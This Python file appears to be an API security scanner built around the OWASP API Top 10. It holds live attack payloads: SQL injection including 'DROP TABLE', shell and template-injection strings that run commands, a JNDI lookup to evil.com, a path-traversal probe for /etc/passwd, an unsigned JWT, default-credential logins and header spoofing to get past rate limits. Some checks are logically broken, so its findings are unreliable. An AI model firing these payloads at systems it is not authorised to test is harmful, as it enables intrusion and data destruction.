#!/usr/bin/env python3
"""
Advanced API Security Tester
OWASP API Security Top 10 testing framework
"""

import requests
import json
import time
import hashlib
from typing import Dict, List, Optional, Tuple
from urllib.parse import urljoin, urlparse
import logging

# Try to import JWT, fallback if not available
try:
    import jwt
    JWT_AVAILABLE = True
except ImportError:
    JWT_AVAILABLE = False
    jwt = None

class APITester:
    """
    Advanced API security testing with OWASP API Top 10 coverage and advanced techniques
    """
    
    def __init__(self, base_url: str, headers: Dict = None, timeout: int = 10, 
                 advanced_mode: bool = True, stealth_mode: bool = False):
        self.base_url = base_url.rstrip('/')
        self.headers = headers or {}
        self.timeout = timeout
        self.advanced_mode = advanced_mode
        self.stealth_mode = stealth_mode
        self.logger = logging.getLogger(__name__)
        self.session = requests.Session()
        self.session.headers.update(self.headers)
        
        # OWASP API Top 10 test categories
        self.test_categories = {
            'API1': 'Broken Object Level Authorization',
            'API2': 'Broken User Authentication', 
            'API3': 'Excessive Data Exposure',
            'API4': 'Lack of Resources & Rate Limiting',
            'API5': 'Broken Function Level Authorization',
            'API6': 'Mass Assignment',
            'API7': 'Security Misconfiguration',
            'API8': 'Injection',
            'API9': 'Improper Assets Management',
            'API10': 'Insufficient Logging & Monitoring'
        }
        
        # Advanced testing capabilities
        self.advanced_techniques = {
            'fuzzing': True,
            'parameter_pollution': True,
            'http_verb_tampering': True,
            'jwt_analysis': True,
            'rate_limit_bypass': True,
            'cache_poisoning': True,
            'timing_attacks': True,
            'side_channel_analysis': True
        }
        
        # Advanced payloads and techniques
        self.advanced_payloads = {
            'jwt_attacks': [
                'none', 'HS256', 'RS256', 'ES256', 'PS256',
                'algorithm_confusion', 'key_confusion', 'kid_injection'
            ],
            'injection_payloads': {
                'sql': ['\' OR 1=1--', '\' UNION SELECT 1,2,3--', '\'; DROP TABLE users; --'],
                'nosql': ['{"$ne": null}', '{"$gt": ""}', '{"$regex": ".*"}'],
                'ldap': ['*', 'admin*', '*)(uid=*', 'admin)(&(password=*)'],
                'xpath': ['\' OR \'1\'=\'1', '\' OR 1=1--', '\' UNION SELECT 1,2,3--'],
                'command': ['; ls', '| whoami', '`id`', '$(whoami)']
            },
            'http_methods': ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS', 'TRACE', 'CONNECT'],
            'content_types': [
                'application/json', 'application/xml', 'application/x-www-form-urlencoded',
                'multipart/form-data', 'text/plain', 'application/octet-stream'
            ]
        }
    
    def test_broken_object_level_authorization(self, endpoints: List[str], 
                                             user_ids: List[str] = None) -> Dict:
        """
        Test for Broken Object Level Authorization (BOLA/IDOR)
        
        Args:
            endpoints: List of API endpoints to test
            user_ids: List of user IDs to test with
            
        Returns:
            Test results dictionary
        """
        self.logger.info("Testing for Broken Object Level Authorization...")
        results = {
            'test_name': 'Broken Object Level Authorization',
            'vulnerabilities': [],
            'recommendations': []
        }
        
        if not user_ids:
            user_ids = ['1', '2', '3', 'admin', 'user', 'test']
        
        for endpoint in endpoints:
            for user_id in user_ids:
                try:
                    # Test with different user IDs
                    test_url = endpoint.replace('{id}', user_id)
                    response = self.session.get(test_url, timeout=self.timeout)
                    
                    if response.status_code == 200:
                        # Check if we can access other users' data
                        data = response.json() if response.content else {}
                        if 'id' in data and data['id'] != user_id:
                            results['vulnerabilities'].append({
                                'endpoint': test_url,
                                'issue': f'Can access user {data["id"]} data with ID {user_id}',
                                'severity': 'High',
                                'evidence': str(data)[:200]
                            })
                    
                except Exception as e:
                    self.logger.debug(f"Error testing BOLA on {endpoint}: {e}")
        
        if not results['vulnerabilities']:
            results['recommendations'].append("No BOLA vulnerabilities detected")
        
        return results
    
    def test_broken_authentication(self, auth_endpoints: List[str]) -> Dict:
        """
        Test for Broken User Authentication
        
        Args:
            auth_endpoints: List of authentication endpoints
            
        Returns:
            Test results dictionary
        """
        self.logger.info("Testing for Broken User Authentication...")
        results = {
            'test_name': 'Broken User Authentication',
            'vulnerabilities': [],
            'recommendations': []
        }
        
        # Test common authentication bypasses
        bypass_payloads = [
            {'username': 'admin', 'password': ''},
            {'username': 'admin', 'password': 'admin'},
            {'username': 'admin', 'password': 'password'},
            {'username': '', 'password': ''},
            {'username': 'admin', 'password': None},
            {'username': 'admin', 'password': 'null'},
            {'username': 'admin', 'password': 'undefined'}
        ]
        
        for endpoint in auth_endpoints:
            for payload in bypass_payloads:
                try:
                    response = self.session.post(endpoint, json=payload, timeout=self.timeout)
                    
                    if response.status_code == 200:
                        # Check if authentication was successful
                        if 'token' in response.text.lower() or 'success' in response.text.lower():
                            results['vulnerabilities'].append({
                                'endpoint': endpoint,
                                'issue': f'Authentication bypass with payload: {payload}',
                                'severity': 'Critical',
                                'evidence': response.text[:200]
                            })
                    
                except Exception as e:
                    self.logger.debug(f"Error testing auth bypass on {endpoint}: {e}")
        
        return results
    
    def test_excessive_data_exposure(self, endpoints: List[str]) -> Dict:
        """
        Test for Excessive Data Exposure
        
        Args:
            endpoints: List of API endpoints to test
            
        Returns:
            Test results dictionary
        """
        self.logger.info("Testing for Excessive Data Exposure...")
        results = {
            'test_name': 'Excessive Data Exposure',
            'vulnerabilities': [],
            'recommendations': []
        }
        
        sensitive_fields = ['password', 'ssn', 'credit_card', 'token', 'secret', 
                           'private_key', 'api_key', 'auth_token']
        
        for endpoint in endpoints:
            try:
                response = self.session.get(endpoint, timeout=self.timeout)
                
                if response.status_code == 200:
                    data = response.json() if response.content else {}
                    
                    # Check for sensitive data in response
                    response_text = str(data).lower()
                    exposed_fields = [field for field in sensitive_fields 
                                   if field in response_text]
                    
                    if exposed_fields:
                        results['vulnerabilities'].append({
                            'endpoint': endpoint,
                            'issue': f'Exposed sensitive fields: {exposed_fields}',
                            'severity': 'High',
                            'evidence': str(data)[:200]
                        })
                
            except Exception as e:
                self.logger.debug(f"Error testing data exposure on {endpoint}: {e}")
        
        return results
    
    def test_rate_limiting(self, endpoints: List[str], 
                          requests_per_second: int = 10) -> Dict:
        """
        Test for Lack of Resources & Rate Limiting
        
        Args:
            endpoints: List of API endpoints to test
            requests_per_second: Number of requests per second to test
            
        Returns:
            Test results dictionary
        """
        self.logger.info("Testing for Rate Limiting...")
        results = {
            'test_name': 'Rate Limiting Test',
            'vulnerabilities': [],
            'recommendations': []
        }
        
        for endpoint in endpoints:
            try:
                # Send rapid requests
                start_time = time.time()
                responses = []
                
                for i in range(requests_per_second * 2):  # Test for 2 seconds
                    response = self.session.get(endpoint, timeout=self.timeout)
                    responses.append(response.status_code)
                    time.sleep(1.0 / requests_per_second)
                
                # Check if rate limiting is working
                success_count = sum(1 for code in responses if code == 200)
                total_requests = len(responses)
                
                if success_count == total_requests:
                    results['vulnerabilities'].append({
                        'endpoint': endpoint,
                        'issue': f'No rate limiting detected - {success_count}/{total_requests} requests succeeded',
                        'severity': 'Medium',
                        'evidence': f'All {total_requests} requests returned 200'
                    })
                else:
                    results['recommendations'].append(f"Rate limiting appears to be working on {endpoint}")
                
            except Exception as e:
                self.logger.debug(f"Error testing rate limiting on {endpoint}: {e}")
        
        return results
    
    def test_mass_assignment(self, endpoints: List[str]) -> Dict:
        """
        Test for Mass Assignment vulnerabilities
        
        Args:
            endpoints: List of API endpoints to test
            
        Returns:
            Test results dictionary
        """
        self.logger.info("Testing for Mass Assignment...")
        results = {
            'test_name': 'Mass Assignment Test',
            'vulnerabilities': [],
            'recommendations': []
        }
        
        # Common mass assignment payloads
        mass_assignment_payloads = [
            {'role': 'admin', 'is_admin': True, 'privileges': 'all'},
            {'user_type': 'admin', 'permissions': ['read', 'write', 'delete']},
            {'access_level': 'root', 'bypass_auth': True}
        ]
        
        for endpoint in endpoints:
            for payload in mass_assignment_payloads:
                try:
                    response = self.session.post(endpoint, json=payload, timeout=self.timeout)
                    
                    if response.status_code == 200:
                        # Check if the assignment was successful
                        if 'admin' in response.text.lower() or 'privilege' in response.text.lower():
                            results['vulnerabilities'].append({
                                'endpoint': endpoint,
                                'issue': f'Mass assignment vulnerability with payload: {payload}',
                                'severity': 'High',
                                'evidence': response.text[:200]
                            })
                    
                except Exception as e:
                    self.logger.debug(f"Error testing mass assignment on {endpoint}: {e}")
        
        return results
    
    def test_injection(self, endpoints: List[str]) -> Dict:
        """
        Test for Injection vulnerabilities
        
        Args:
            endpoints: List of API endpoints to test
            
        Returns:
            Test results dictionary
        """
        self.logger.info("Testing for Injection vulnerabilities...")
        results = {
            'test_name': 'Injection Test',
            'vulnerabilities': [],
            'recommendations': []
        }
        
        # Common injection payloads
        injection_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "<script>alert('XSS')</script>",
            "{{7*7}}",
            "${7*7}",
            "#{7*7}"
        ]
        
        for endpoint in endpoints:
            for payload in injection_payloads:
                try:
                    # Test in different parameters
                    test_data = {
                        'id': payload,
                        'name': payload,
                        'search': payload,
                        'filter': payload
                    }
                    
                    response = self.session.get(endpoint, params=test_data, timeout=self.timeout)
                    
                    # Check for injection indicators
                    if payload in response.text or 'error' in response.text.lower():
                        results['vulnerabilities'].append({
                            'endpoint': endpoint,
                            'issue': f'Possible injection vulnerability with payload: {payload}',
                            'severity': 'High',
                            'evidence': response.text[:200]
                        })
                    
                except Exception as e:
                    self.logger.debug(f"Error testing injection on {endpoint}: {e}")
        
        return results
    
    def test_jwt_security(self, jwt_token: str) -> Dict:
        """
        Test JWT token security
        
        Args:
            jwt_token: JWT token to analyze
            
        Returns:
            Test results dictionary
        """
        self.logger.info("Testing JWT Security...")
        results = {
            'test_name': 'JWT Security Test',
            'vulnerabilities': [],
            'recommendations': []
        }
        
        if not JWT_AVAILABLE:
            results['vulnerabilities'].append({
                'issue': 'JWT library not available',
                'severity': 'Low',
                'evidence': 'PyJWT not installed - JWT testing disabled'
            })
            return results
        
        try:
            # Decode JWT without verification
            decoded = jwt.decode(jwt_token, options={"verify_signature": False})
            
            # Check for common JWT vulnerabilities
            if decoded.get('alg') == 'none':
                results['vulnerabilities'].append({
                    'issue': 'JWT uses "none" algorithm',
                    'severity': 'Critical',
                    'evidence': 'Algorithm set to "none"'
                })
            
            if not decoded.get('exp'):
                results['vulnerabilities'].append({
                    'issue': 'JWT has no expiration time',
                    'severity': 'Medium',
                    'evidence': 'No "exp" claim found'
                })
            
            if decoded.get('iat') and decoded.get('exp'):
                # Check if token is expired
                current_time = time.time()
                if decoded['exp'] < current_time:
                    results['vulnerabilities'].append({
                        'issue': 'JWT token is expired',
                        'severity': 'Low',
                        'evidence': f'Expired at {decoded["exp"]}'
                    })
            
            # Check for weak secrets
            if 'secret' in str(decoded).lower():
                results['vulnerabilities'].append({
                    'issue': 'JWT may contain sensitive information',
                    'severity': 'Medium',
                    'evidence': 'Contains "secret" in payload'
                })
            
        except Exception as e:
            results['vulnerabilities'].append({
                'issue': f'JWT parsing error: {e}',
                'severity': 'Low',
                'evidence': str(e)
            })
        
        return results
    
    def comprehensive_test(self, endpoints: List[str], 
                          auth_endpoints: List[str] = None,
                          jwt_token: str = None) -> Dict:
        """
        Run comprehensive API security tests
        
        Args:
            endpoints: List of API endpoints to test
            auth_endpoints: List of authentication endpoints
            jwt_token: JWT token for testing
            
        Returns:
            Comprehensive test results
        """
        self.logger.info("Starting comprehensive API security test...")
        
        all_results = {
            'base_url': self.base_url,
            'test_time': time.strftime('%Y-%m-%d %H:%M:%S'),
            'tests': []
        }
        
        # Run all tests
        test_functions = [
            self.test_broken_object_level_authorization,
            self.test_excessive_data_exposure,
            self.test_rate_limiting,
            self.test_mass_assignment,
            self.test_injection
        ]
        
        for test_func in test_functions:
            try:
                if test_func == self.test_broken_authentication and auth_endpoints:
                    results = test_func(auth_endpoints)
                else:
                    results = test_func(endpoints)
                
                all_results['tests'].append(results)
                
            except Exception as e:
                self.logger.error(f"Error running {test_func.__name__}: {e}")
        
        # Test JWT if provided
        if jwt_token:
            jwt_results = self.test_jwt_security(jwt_token)
            all_results['tests'].append(jwt_results)
        
        # Calculate summary
        total_vulnerabilities = sum(len(test.get('vulnerabilities', [])) 
                                  for test in all_results['tests'])
        
        all_results['summary'] = {
            'total_tests': len(all_results['tests']),
            'total_vulnerabilities': total_vulnerabilities,
            'critical_count': sum(1 for test in all_results['tests'] 
                                for vuln in test.get('vulnerabilities', [])
                                if vuln.get('severity') == 'Critical'),
            'high_count': sum(1 for test in all_results['tests'] 
                            for vuln in test.get('vulnerabilities', [])
                            if vuln.get('severity') == 'High')
        }
        
        return all_results
    
    def save_results(self, results: Dict, filename: str = None) -> str:
        """
        Save test results to JSON file
        
        Args:
            results: Test results dictionary
            filename: Output filename (optional)
            
        Returns:
            Path to saved file
        """
        if filename is None:
            timestamp = time.strftime("%Y%m%d_%H%M%S")
            filename = f"api_test_results_{timestamp}.json"
        
        filepath = f"logs/api_logs/{filename}"
        
        try:
            with open(filepath, 'w') as f:
                json.dump(results, f, indent=2)
            self.logger.info(f"Results saved to {filepath}")
            return filepath
        except Exception as e:
            self.logger.error(f"Failed to save results: {e}")
            return ""
    
    def advanced_api_test(self, endpoints: List[str], 
                         test_options: Dict = None) -> Dict:
        """
        Advanced comprehensive API security testing with all techniques
        
        Args:
            endpoints: List of API endpoints to test
            test_options: Advanced testing configuration
            
        Returns:
            Advanced API test results
        """
        if test_options is None:
            test_options = {
                'test_depth': 'comprehensive',
                'stealth_mode': self.stealth_mode,
                'advanced_techniques': self.advanced_techniques,
                'custom_payloads': True,
                'timing_analysis': True,
                'side_channel_analysis': True,
                'fuzzing': True,
                'parameter_pollution': True,
                'http_verb_tampering': True,
                'jwt_analysis': True,
                'rate_limit_bypass': True,
                'cache_poisoning': True
            }
        
        self.logger.info("Starting advanced API security testing...")
        
        results = {
            'test_time': time.strftime('%Y-%m-%d %H:%M:%S'),
            'test_type': 'advanced',
            'base_url': self.base_url,
            'endpoints_tested': len(endpoints),
            'test_options': test_options,
            'vulnerabilities': [],
            'recommendations': [],
            'statistics': {
                'total_tests': 0,
                'vulnerabilities_found': 0,
                'critical_count': 0,
                'high_count': 0,
                'medium_count': 0,
                'low_count': 0,
                'info_count': 0
            }
        }
        
        for endpoint in endpoints:
            endpoint_results = self._advanced_endpoint_test(endpoint, test_options)
            results['vulnerabilities'].extend(endpoint_results.get('vulnerabilities', []))
            results['recommendations'].extend(endpoint_results.get('recommendations', []))
            results['statistics']['total_tests'] += endpoint_results.get('tests_performed', 0)
        
        # Update statistics
        for vuln in results['vulnerabilities']:
            results['statistics']['vulnerabilities_found'] += 1
            severity = vuln.get('severity', 'low').lower()
            if severity == 'critical':
                results['statistics']['critical_count'] += 1
            elif severity == 'high':
                results['statistics']['high_count'] += 1
            elif severity == 'medium':
                results['statistics']['medium_count'] += 1
            elif severity == 'low':
                results['statistics']['low_count'] += 1
            else:
                results['statistics']['info_count'] += 1
        
        return results
    
    def _advanced_endpoint_test(self, endpoint: str, test_options: Dict) -> Dict:
        """Advanced testing for a single endpoint"""
        results = {
            'endpoint': endpoint,
            'vulnerabilities': [],
            'recommendations': [],
            'tests_performed': 0
        }
        
        try:
            # Advanced HTTP method testing
            if test_options.get('http_verb_tampering', True):
                method_results = self._test_http_verb_tampering(endpoint)
                results['vulnerabilities'].extend(method_results.get('vulnerabilities', []))
                results['tests_performed'] += method_results.get('tests_performed', 0)
            
            # Advanced parameter pollution testing
            if test_options.get('parameter_pollution', True):
                pollution_results = self._test_parameter_pollution(endpoint)
                results['vulnerabilities'].extend(pollution_results.get('vulnerabilities', []))
                results['tests_performed'] += pollution_results.get('tests_performed', 0)
            
            # Advanced injection testing
            injection_results = self._test_advanced_injection(endpoint)
            results['vulnerabilities'].extend(injection_results.get('vulnerabilities', []))
            results['tests_performed'] += injection_results.get('tests_performed', 0)
            
            # Advanced JWT testing
            if test_options.get('jwt_analysis', True) and JWT_AVAILABLE:
                jwt_results = self._test_advanced_jwt(endpoint)
                results['vulnerabilities'].extend(jwt_results.get('vulnerabilities', []))
                results['tests_performed'] += jwt_results.get('tests_performed', 0)
            
            # Advanced rate limit bypass testing
            if test_options.get('rate_limit_bypass', True):
                rate_results = self._test_rate_limit_bypass(endpoint)
                results['vulnerabilities'].extend(rate_results.get('vulnerabilities', []))
                results['tests_performed'] += rate_results.get('tests_performed', 0)
            
            # Advanced cache poisoning testing
            if test_options.get('cache_poisoning', True):
                cache_results = self._test_cache_poisoning(endpoint)
                results['vulnerabilities'].extend(cache_results.get('vulnerabilities', []))
                results['tests_performed'] += cache_results.get('tests_performed', 0)
            
            # Advanced fuzzing
            if test_options.get('fuzzing', True):
                fuzz_results = self._test_advanced_fuzzing(endpoint)
                results['vulnerabilities'].extend(fuzz_results.get('vulnerabilities', []))
                results['tests_performed'] += fuzz_results.get('tests_performed', 0)
            
            # Advanced timing attacks
            if test_options.get('timing_analysis', True):
                timing_results = self._test_timing_attacks(endpoint)
                results['vulnerabilities'].extend(timing_results.get('vulnerabilities', []))
                results['tests_performed'] += timing_results.get('tests_performed', 0)
            
        except Exception as e:
            self.logger.error(f"Advanced endpoint testing error for {endpoint}: {e}")
            results['vulnerabilities'].append({
                'type': 'Testing Error',
                'severity': 'Low',
                'description': f'Error testing endpoint: {str(e)}',
                'endpoint': endpoint
            })
        
        return results
    
    def _test_http_verb_tampering(self, endpoint: str) -> Dict:
        """Test HTTP verb tampering vulnerabilities"""
        results = {'vulnerabilities': [], 'tests_performed': 0}
        
        try:
            url = urljoin(self.base_url, endpoint)
            
            for method in self.advanced_payloads['http_methods']:
                try:
                    response = self.session.request(method, url, timeout=self.timeout)
                    results['tests_performed'] += 1
                    
                    # Check for verb tampering vulnerabilities
                    if response.status_code == 200 and method not in ['GET', 'POST']:
                        results['vulnerabilities'].append({
                            'type': 'HTTP Verb Tampering',
                            'severity': 'Medium',
                            'description': f'HTTP {method} method accepted on {endpoint}',
                            'endpoint': endpoint,
                            'method': method,
                            'status_code': response.status_code
                        })
                    
                    # Check for dangerous methods
                    if method in ['TRACE', 'CONNECT'] and response.status_code == 200:
                        results['vulnerabilities'].append({
                            'type': 'Dangerous HTTP Method',
                            'severity': 'High',
                            'description': f'Dangerous HTTP {method} method enabled',
                            'endpoint': endpoint,
                            'method': method,
                            'status_code': response.status_code
                        })
                
                except Exception as e:
                    self.logger.debug(f"HTTP verb tampering test error: {e}")
        
        except Exception as e:
            self.logger.error(f"HTTP verb tampering test error: {e}")
        
        return results
    
    def _test_parameter_pollution(self, endpoint: str) -> Dict:
        """Test HTTP parameter pollution vulnerabilities"""
        results = {'vulnerabilities': [], 'tests_performed': 0}
        
        try:
            url = urljoin(self.base_url, endpoint)
            
            # Test parameter pollution with various techniques
            pollution_payloads = [
                {'param1': 'value1', 'param1': 'value2'},  # Duplicate parameters
                {'param[]': 'value1', 'param[]': 'value2'},  # Array parameters
                {'param': 'value1', 'param': 'value2'},  # Multiple values
            ]
            
            for payload in pollution_payloads:
                try:
                    response = self.session.post(url, data=payload, timeout=self.timeout)
                    results['tests_performed'] += 1
                    
                    # Analyze response for parameter pollution indicators
                    if 'value1' in response.text and 'value2' in response.text:
                        results['vulnerabilities'].append({
                            'type': 'HTTP Parameter Pollution',
                            'severity': 'Medium',
                            'description': f'Parameter pollution detected on {endpoint}',
                            'endpoint': endpoint,
                            'payload': payload,
                            'status_code': response.status_code
                        })
                
                except Exception as e:
                    self.logger.debug(f"Parameter pollution test error: {e}")
        
        except Exception as e:
            self.logger.error(f"Parameter pollution test error: {e}")
        
        return results
    
    def _test_advanced_injection(self, endpoint: str) -> Dict:
        """Test advanced injection vulnerabilities"""
        results = {'vulnerabilities': [], 'tests_performed': 0}
        
        try:
            url = urljoin(self.base_url, endpoint)
            
            # Test different injection types
            for injection_type, payloads in self.advanced_payloads['injection_payloads'].items():
                for payload in payloads:
                    try:
                        # Test with different content types
                        for content_type in self.advanced_payloads['content_types']:
                            headers = {'Content-Type': content_type}
                            
                            if content_type == 'application/json':
                                data = json.dumps({'param': payload})
                            else:
                                data = {'param': payload}
                            
                            response = self.session.post(url, data=data, headers=headers, timeout=self.timeout)
                            results['tests_performed'] += 1
                            
                            # Check for injection indicators
                            if self._detect_injection_response(response, injection_type):
                                results['vulnerabilities'].append({
                                    'type': f'{injection_type.upper()} Injection',
                                    'severity': 'High',
                                    'description': f'{injection_type.upper()} injection vulnerability detected',
                                    'endpoint': endpoint,
                                    'payload': payload,
                                    'injection_type': injection_type,
                                    'content_type': content_type,
                                    'status_code': response.status_code
                                })
                    
                    except Exception as e:
                        self.logger.debug(f"Injection test error: {e}")
        
        except Exception as e:
            self.logger.error(f"Advanced injection test error: {e}")
        
        return results
    
    def _test_advanced_jwt(self, endpoint: str) -> Dict:
        """Test advanced JWT vulnerabilities"""
        results = {'vulnerabilities': [], 'tests_performed': 0}
        
        if not JWT_AVAILABLE:
            return results
        
        try:
            url = urljoin(self.base_url, endpoint)
            
            # Test JWT attack techniques
            for attack in self.advanced_payloads['jwt_attacks']:
                try:
                    jwt_payload = self._generate_jwt_attack_payload(attack)
                    headers = {'Authorization': f'Bearer {jwt_payload}'}
                    
                    response = self.session.get(url, headers=headers, timeout=self.timeout)
                    results['tests_performed'] += 1
                    
                    # Check for JWT vulnerabilities
                    if response.status_code == 200:
                        results['vulnerabilities'].append({
                            'type': 'JWT Vulnerability',
                            'severity': 'High',
                            'description': f'JWT {attack} attack successful',
                            'endpoint': endpoint,
                            'attack_type': attack,
                            'status_code': response.status_code
                        })
                
                except Exception as e:
                    self.logger.debug(f"JWT attack test error: {e}")
        
        except Exception as e:
            self.logger.error(f"Advanced JWT test error: {e}")
        
        return results
    
    def _test_rate_limit_bypass(self, endpoint: str) -> Dict:
        """Test rate limit bypass techniques"""
        results = {'vulnerabilities': [], 'tests_performed': 0}
        
        try:
            url = urljoin(self.base_url, endpoint)
            
            # Test various rate limit bypass techniques
            bypass_techniques = [
                {'headers': {'X-Forwarded-For': '127.0.0.1'}},
                {'headers': {'X-Real-IP': '127.0.0.1'}},
                {'headers': {'X-Originating-IP': '127.0.0.1'}},
                {'headers': {'X-Remote-IP': '127.0.0.1'}},
                {'headers': {'X-Client-IP': '127.0.0.1'}},
            ]
            
            for technique in bypass_techniques:
                try:
                    # Send multiple requests to test rate limiting
                    for i in range(10):
                        response = self.session.get(url, **technique, timeout=self.timeout)
                        results['tests_performed'] += 1
                        
                        if response.status_code == 200:
                            results['vulnerabilities'].append({
                                'type': 'Rate Limit Bypass',
                                'severity': 'Medium',
                                'description': f'Rate limit bypass successful with {technique}',
                                'endpoint': endpoint,
                                'bypass_technique': technique,
                                'status_code': response.status_code
                            })
                            break
                
                except Exception as e:
                    self.logger.debug(f"Rate limit bypass test error: {e}")
        
        except Exception as e:
            self.logger.error(f"Rate limit bypass test error: {e}")
        
        return results
    
    def _test_cache_poisoning(self, endpoint: str) -> Dict:
        """Test cache poisoning vulnerabilities"""
        results = {'vulnerabilities': [], 'tests_performed': 0}
        
        try:
            url = urljoin(self.base_url, endpoint)
            
            # Test cache poisoning techniques
            poisoning_headers = [
                {'X-Forwarded-Host': 'evil.com'},
                {'X-Forwarded-Server': 'evil.com'},
                {'X-Host': 'evil.com'},
                {'X-Forwarded-For': 'evil.com'},
            ]
            
            for headers in poisoning_headers:
                try:
                    response = self.session.get(url, headers=headers, timeout=self.timeout)
                    results['tests_performed'] += 1
                    
                    # Check for cache poisoning indicators
                    if 'evil.com' in response.text or 'evil.com' in response.headers.get('Location', ''):
                        results['vulnerabilities'].append({
                            'type': 'Cache Poisoning',
                            'severity': 'High',
                            'description': f'Cache poisoning vulnerability detected',
                            'endpoint': endpoint,
                            'poisoning_headers': headers,
                            'status_code': response.status_code
                        })
                
                except Exception as e:
                    self.logger.debug(f"Cache poisoning test error: {e}")
        
        except Exception as e:
            self.logger.error(f"Cache poisoning test error: {e}")
        
        return results
    
    def _test_advanced_fuzzing(self, endpoint: str) -> Dict:
        """Test advanced fuzzing techniques"""
        results = {'vulnerabilities': [], 'tests_performed': 0}
        
        try:
            url = urljoin(self.base_url, endpoint)
            
            # Advanced fuzzing payloads
            fuzz_payloads = [
                '../../../etc/passwd',
                '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
                '<script>alert("XSS")</script>',
                '${jndi:ldap://evil.com/a}',
                '{{7*7}}',
                '{{config}}',
                '{{self.__init__.__globals__.__builtins__.__import__("os").popen("id").read()}}'
            ]
            
            for payload in fuzz_payloads:
                try:
                    # Test with different parameters
                    test_params = {'id': payload, 'file': payload, 'path': payload, 'name': payload}
                    
                    response = self.session.get(url, params=test_params, timeout=self.timeout)
                    results['tests_performed'] += 1
                    
                    # Check for fuzzing results
                    if self._detect_fuzzing_response(response, payload):
                        results['vulnerabilities'].append({
                            'type': 'Fuzzing Vulnerability',
                            'severity': 'Medium',
                            'description': f'Fuzzing vulnerability detected with payload: {payload}',
                            'endpoint': endpoint,
                            'payload': payload,
                            'status_code': response.status_code
                        })
                
                except Exception as e:
                    self.logger.debug(f"Fuzzing test error: {e}")
        
        except Exception as e:
            self.logger.error(f"Advanced fuzzing test error: {e}")
        
        return results
    
    def _test_timing_attacks(self, endpoint: str) -> Dict:
        """Test timing attack vulnerabilities"""
        results = {'vulnerabilities': [], 'tests_performed': 0}
        
        try:
            url = urljoin(self.base_url, endpoint)
            
            # Test timing attacks with different payloads
            timing_payloads = [
                'admin', 'administrator', 'root', 'user', 'test',
                'password', '123456', 'admin123', 'password123'
            ]
            
            baseline_time = self._measure_response_time(url, {})
            
            for payload in timing_payloads:
                try:
                    test_data = {'username': payload, 'password': 'test'}
                    response_time = self._measure_response_time(url, test_data)
                    results['tests_performed'] += 1
                    
                    # Check for timing differences
                    time_diff = abs(response_time - baseline_time)
                    if time_diff > 0.1:  # 100ms difference
                        results['vulnerabilities'].append({
                            'type': 'Timing Attack',
                            'severity': 'Medium',
                            'description': f'Timing difference detected for payload: {payload}',
                            'endpoint': endpoint,
                            'payload': payload,
                            'time_difference': time_diff,
                            'baseline_time': baseline_time,
                            'response_time': response_time
                        })
                
                except Exception as e:
                    self.logger.debug(f"Timing attack test error: {e}")
        
        except Exception as e:
            self.logger.error(f"Timing attack test error: {e}")
        
        return results
    
    def _detect_injection_response(self, response, injection_type: str) -> bool:
        """Detect injection vulnerabilities in response"""
        injection_indicators = {
            'sql': ['mysql', 'sql', 'database', 'syntax error', 'sql error', 'mysql error'],
            'nosql': ['mongo', 'mongodb', 'nosql', 'bson'],
            'ldap': ['ldap', 'directory', 'dn:', 'cn='],
            'xpath': ['xpath', 'xml', 'xquery'],
            'command': ['uid=', 'gid=', 'groups=', 'root:', 'bin:']
        }
        
        if injection_type in injection_indicators:
            response_text = response.text.lower()
            return any(indicator in response_text for indicator in injection_indicators[injection_type])
        
        return False
    
    def _detect_fuzzing_response(self, response, payload: str) -> bool:
        """Detect fuzzing vulnerabilities in response"""
        # Check for file inclusion
        if payload.startswith('../') and ('root:' in response.text or 'bin:' in response.text):
            return True
        
        # Check for XSS
        if '<script>' in payload and '<script>' in response.text:
            return True
        
        # Check for template injection
        if '{{' in payload and '{{' in response.text:
            return True
        
        # Check for LDAP injection
        if 'jndi:' in payload and 'ldap' in response.text.lower():
            return True
        
        return False
    
    def _generate_jwt_attack_payload(self, attack_type: str) -> str:
        """Generate JWT attack payloads"""
        if attack_type == 'none':
            return 'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMn0.'
        elif attack_type == 'HS256':
            return 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMn0.signature'
        else:
            return 'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMn0.signature'
    
    def _measure_response_time(self, url: str, data: Dict) -> float:
        """Measure response time for timing attacks"""
        start_time = time.time()
        try:
            if data:
                self.session.post(url, data=data, timeout=self.timeout)
            else:
                self.session.get(url, timeout=self.timeout)
        except:
            pass
        return time.time() - start_time
